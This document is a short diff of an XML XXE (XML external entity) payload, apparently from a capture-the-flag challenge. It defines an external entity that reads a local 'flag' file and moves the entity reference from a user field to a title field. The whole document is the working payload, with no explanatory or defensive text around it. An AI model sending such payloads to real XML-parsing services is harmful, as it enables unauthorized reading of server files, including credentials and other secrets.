@@ -2,7 +2,7 @@
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///flag_9e94ef10785f801d16ccebc319680f52" >]>
 <creds>
-    <user>&xxe;</user>
+    <title>&xxe;</title>
     <description>"Hi"</description>
     <link>"www.google.com"</link>
 </creds>
